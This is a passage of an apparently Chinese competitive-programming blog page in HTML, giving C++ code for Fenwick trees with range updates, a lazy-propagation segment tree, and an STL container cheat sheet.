class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a[N], tr[N];</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">lowbit</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x &amp; -x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = x; i &lt;= n; i += <span class="built_in">lowbit</span>(i))</span><br><span class="line">        tr[i] += v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = x; i; i -= <span class="built_in">lowbit</span>(i))</span><br><span class="line">        res += tr[i];</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">        <span class="built_in">add</span>(i, a[i] - a[i - <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (m--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> op[<span class="number">2</span>];</span><br><span class="line">        <span class="type">int</span> l, r, d;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s %d&quot;</span>, op, &amp;l);</span><br><span class="line">        <span class="keyword">if</span> (*op == <span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;r, &amp;d);</span><br><span class="line">            <span class="built_in">add</span>(l, d);</span><br><span class="line">            <span class="built_in">add</span>(r + <span class="number">1</span>, -d);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">query</span>(l));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>区间修改+区间修改</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> a[N];</span><br><span class="line">LL tr[N], tri[N];</span><br><span class="line"><span class="comment">//tr[]数组是原始数组的差分数组d[i]的树状数组</span></span><br><span class="line"><span class="comment">//tri[]数组是原始数组的差分数组乘以i即i*d[i]的树状数组</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">lowbit</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x &amp; -x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(LL c[], <span class="type">int</span> x, <span class="type">int</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = x; i &lt;= n; i += <span class="built_in">lowbit</span>(i))</span><br><span class="line">        c[i] += v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LL <span class="title">query</span><span class="params">(LL c[], <span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LL res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = x; i; i -= <span class="built_in">lowbit</span>(i))</span><br><span class="line">        res += c[i];</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//对应最后一步推导的公式</span></span><br><span class="line"><span class="function">LL <span class="title">get_sum</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">query</span>(tr, x) * (x + <span class="number">1</span>) - <span class="built_in">query</span>(tri, x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="comment">//输入数组a[i]</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">    <span class="comment">//先构造两个数组 d[i] 和 i*d[i]</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) </span><br><span class="line">        tr[i] = a[i] - a[i - <span class="number">1</span>], tri[i] = tr[i] * i;</span><br><span class="line">    <span class="comment">//原地 O(n) 建树状数组</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> x = <span class="number">1</span>; x &lt;= n; ++x)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = x - <span class="number">1</span>; i &gt;= x - <span class="built_in">lowbit</span>(x) + <span class="number">1</span>; i -= <span class="built_in">lowbit</span>(i))</span><br><span class="line">            tr[x] += tr[i], tri[x] += tri[i];</span><br><span class="line">    <span class="comment">//读入查询</span></span><br><span class="line">    <span class="keyword">while</span> (m--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> op[<span class="number">2</span>];</span><br><span class="line">        <span class="type">int</span> l, r, c;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, op);</span><br><span class="line">        <span class="keyword">if</span> (op[<span class="number">0</span>] == <span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;l, &amp;r);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, <span class="built_in">get_sum</span>(r) - <span class="built_in">get_sum</span>(l - <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;l, &amp;r, &amp;c);</span><br><span class="line">            <span class="built_in">add</span>(tr, l, c), <span class="built_in">add</span>(tr, r + <span class="number">1</span>, -c);</span><br><span class="line">            <span class="built_in">add</span>(tri, l, l * c), <span class="built_in">add</span>(tri, r + <span class="number">1</span>, (r + <span class="number">1</span>) * -c);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="线段树写法">线段树写法</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> w[N];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> l, r;</span><br><span class="line">    LL sum, add;</span><br><span class="line">&#125;tr[N * <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushup</span><span class="params">(<span class="type">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    tr[u].sum = tr[u &lt;&lt; <span class="number">1</span>].sum + tr[u &lt;&lt; <span class="number">1</span> | <span class="number">1</span>].sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushdown</span><span class="params">(<span class="type">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> &amp;root = tr[u], &amp;left = tr[u &lt;&lt; <span class="number">1</span>], &amp;right = tr[u &lt;&lt; <span class="number">1</span> | <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> (root.add)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//传递懒标记，更新子树</span></span><br><span class="line">        left.add += root.add, left.sum += (LL) (left.r - left.l + <span class="number">1</span>) * root.add;</span><br><span class="line">        right.add += root.add, right.sum += (LL) (right.r - right.l + <span class="number">1</span>) * root.add;</span><br><span class="line">        <span class="comment">//删除父结点懒标记</span></span><br><span class="line">        root.add = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l == r) tr[u] = &#123;l, r, w[l], <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        tr[u] = &#123;l, r&#125;;</span><br><span class="line">        <span class="type">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">build</span>(u &lt;&lt; <span class="number">1</span>, l, mid), <span class="built_in">build</span>(u &lt;&lt; <span class="number">1</span> | <span class="number">1</span>, mid + <span class="number">1</span>, r);</span><br><span class="line">        <span class="built_in">pushup</span>(u);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">modify</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &lt;= tr[u].l &amp;&amp; tr[u].r &lt;= r)</span><br><span class="line">    &#123;</span><br><span class="line">        tr[u].sum += (tr[u].r - tr[u].l + <span class="number">1</span>) * v;</span><br><span class="line">        tr[u].add += v;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">pushdown</span>(u);</span><br><span class="line">        <span class="type">int</span> mid = tr[u].l + tr[u].r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (l &lt;= mid) <span class="built_in">modify</span>(u &lt;&lt; <span class="number">1</span>, l, r, v);</span><br><span class="line">        <span class="keyword">if</span> (r &gt; mid) <span class="built_in">modify</span>(u &lt;&lt; <span class="number">1</span> | <span class="number">1</span>, l, r, v);</span><br><span class="line">        <span class="built_in">pushup</span>(u);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LL <span class="title">query</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &lt;= tr[u].l &amp;&amp; tr[u].r &lt;= r) <span class="keyword">return</span> tr[u].sum;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">pushdown</span>(u);</span><br><span class="line">    <span class="type">int</span> mid = tr[u].l + tr[u].r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    LL v = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (l &lt;= mid) v = <span class="built_in">query</span>(u &lt;&lt; <span class="number">1</span>, l, r);</span><br><span class="line">    <span class="keyword">if</span> (r &gt; mid) v += <span class="built_in">query</span>(u &lt;&lt; <span class="number">1</span> | <span class="number">1</span>, l, r);</span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;w[i]);</span><br><span class="line">    <span class="built_in">build</span>(<span class="number">1</span>, <span class="number">1</span>, n);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> op[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> l, r, t;</span><br><span class="line">    <span class="keyword">while</span> (m -- )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s%d%d&quot;</span>, op, &amp;l, &amp;r);</span><br><span class="line">        <span class="keyword">if</span> (*op == <span class="string">&#x27;Q&#x27;</span>) <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, <span class="built_in">query</span>(<span class="number">1</span>, l, r));</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;t);</span><br><span class="line">            <span class="built_in">modify</span>(<span class="number">1</span>, l, r, t);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="stl">STL</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sort</span>(a, a+n); <span class="comment">//数组名 + 数组大小</span></span><br><span class="line"><span class="built_in">sort</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>());</span><br><span class="line"><span class="comment">//自定义比较方法</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">bool</span> <span class="title">my_cmp</span><span class="params">(<span class="type">const</span> pair&lt;<span class="type">long</span> <span class="type">long</span>, string&gt;&amp; a, <span class="type">const</span> pair&lt;<span class="type">long</span> <span class="type">long</span>, string&gt;&amp; b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.first == b.first ? (a.second &lt; b.second) : (a.first &gt; b.first);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">sort</span>(v[r].<span class="built_in">begin</span>(), v[r].<span class="built_in">end</span>(), my_cmp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vector, 变长数组，倍增的思想</span><br><span class="line">    <span class="built_in">size</span>()  返回元素个数</span><br><span class="line">    <span class="built_in">empty</span>()  返回是否为空</span><br><span class="line">    <span class="built_in">clear</span>()  清空</span><br><span class="line">    <span class="built_in">front</span>()/<span class="built_in">back</span>()</span><br><span class="line">    <span class="built_in">push_back</span>()/<span class="built_in">pop_back</span>()</span><br><span class="line">    <span class="built_in">begin</span>()/<span class="built_in">end</span>()</span><br><span class="line">    []</span><br><span class="line">    支持比较运算，按字典序</span><br><span class="line"></span><br><span class="line">pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;</span><br><span class="line">    first, 第一个元素</span><br><span class="line">    second, 第二个元素</span><br><span class="line">    支持比较运算，以first为第一关键字，以second为第二关键字（字典序）</span><br><span class="line"></span><br><span class="line">string，字符串</span><br><span class="line">    <span class="built_in">size</span>()/<span class="built_in">length</span>()  返回字符串长度</span><br><span class="line">    <span class="built_in">empty</span>()</span><br><span class="line">    <span class="built_in">clear</span>()</span><br><span class="line">    <span class="built_in">substr</span>(起始下标，(子串长度))  返回子串</span><br><span class="line">    <span class="built_in">c_str</span>()  返回字符串所在字符数组的起始地址</span><br><span class="line"></span><br><span class="line">queue, 队列</span><br><span class="line">    <span class="built_in">size</span>()</span><br><span class="line">    <span class="built_in">empty</span>()</span><br><span class="line">    <span class="built_in">push</span>()  向队尾插入一个元素</span><br><span class="line">    <span class="built_in">front</span>()  返回队头元素</span><br><span class="line">    <span class="built_in">back</span>()  返回队尾元素</span><br><span class="line">    <span class="built_in">pop</span>()  弹出队头元素</span><br><span class="line"></span><br><span class="line">priority_queue, 优先队列，默认是大根堆</span><br><span class="line">    <span class="built_in">size</span>()</span><br><span class="line">    <span class="built_in">empty</span>()</span><br><span class="line">    <span class="built_in">push</span>()  插入一个元素</span><br><span class="line">    <span class="built_in">top</span>()  返回堆顶元素</span><br><span class="line">    <span class="built_in">pop</span>()  弹出堆顶元素</span><br><span class="line">    定义成小根堆的方式：priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, greater&lt;<span class="type">int</span>&gt;&gt; q;</span><br><span class="line"></span><br><span class="line">stack, 栈</span><br><span class="line">    <span class="built_in">size</span>()</span><br><span class="line">    <span class="built_in">empty</span>()</span><br><span class="line">    <span class="built_in">push</span>()  向栈顶插入一个元素</span><br><span class="line">    <span class="built_in">top</span>()  返回栈顶元素</span><br><span class="line">    <span class="built_in">pop</span>()  弹出栈顶元素</span><br><span class="line"></span><br><span class="line">deque, 双端队列</span><br><span class="line">    <span class="built_in">size</span>()</span><br><span class="line">    <span class="built_in">empty</span>()</span><br><span class="line">    <span class="built_in">clear</span>()</span><br><span class="line">    <span class="built_in">front</span>()/<span class="built_in">back</span>()</span><br><span class="line">    <span class="built_in">push_back</span>()/<span class="built_in">pop_back</span>()</span><br><span class="line">    <span class="built_in">push_front</span>()/<span class="built_in">pop_front</span>()</span><br><span class="line">    <span class="built_in">begin</span>()/<span class="built_in">end</span>()</span><br><span class="line">    []</span><br><span class="line"></span><br><span class="line">set, map, multiset, multimap, 基于平衡二叉树（红黑树），动态维护有序序列</span><br><span class="line">    <span class="built_in">size</span>()</span><br><span class="line">    <span class="built_in">empty</span>()</span><br><span class="line">    <span class="built_in">clear</span>()</span><br><span class="line">    <span class="built_in">begin</span>()/<span class="built_in">end</span>()</span><br><span class="line">    ++, -- 返回前驱和后继，时间复杂度 <span class="built_in">O</span>(logn)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 自定义排序方法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">my_cmp</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> pair&lt;<span class="type">long</span> <span class="type">long</span>, string&gt;&amp; a, <span class="type">const</span> pair&lt;<span class="type">long</span> <span class="type">long</span>, string&gt;&amp; b)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.first == b.first ? (a.second &lt; b.second) : (a.first &gt; b.first);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">set&lt;pair&lt;<span class="type">long</span> <span class="type">long</span>, string&gt;, my_cmp&gt; s;</span><br><span class="line"></span><br><span class="line">    set/<span class="function">multiset</span></span><br><span class="line"><span class="function">        <span class="title">insert</span><span class="params">()</span>  插入一个数</span></span><br><span class="line"><span class="function">        <span class="title">find</span><span class="params">()</span>  查找一个数</span></span><br><span class="line"><span class="function">        <span class="title">count</span><span class="params">()</span>  返回某一个数的个数</span></span><br><span class="line"><span class="function">        <span class="title">erase</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            <span class="params">(<span class="number">1</span>)</span> 输入是一个数x，删除所有x   <span class="title">O</span><span class="params">(k + logn)</span></span></span><br><span class="line"><span class="function">            <span class="params">(<span class="number">2</span>)</span> 输入一个迭代器，删除这个迭代器</span></span><br><span class="line"><span class="function">        <span class="title">lower_bound</span><span class="params">()</span>/<span class="title">upper_bound</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            <span class="title">lower_bound</span><span class="params">(x)</span>  返回大于等于x的最小的数的迭代器</span></span><br><span class="line"><span class="function">            <span class="title">upper_bound</span><span class="params">(x)</span>  返回大于x的最小的数的迭代器</span></span><br><span class="line"><span class="function">    map/multimap</span></span><br><span class="line"><span class="function">        <span class="title">insert</span><span class="params">()</span>  插入的数是一个pair</span></span><br><span class="line"><span class="function">        <span class="title">erase</span><span class="params">()</span>  输入的参数是pair或者迭代器</span></span><br><span class="line"><span class="function">        <span class="title">find</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        []  注意multimap不支持此操作。 时间复杂度是 <span class="title">O</span><span class="params">(logn)</span></span></span><br><span class="line"><span class="function">        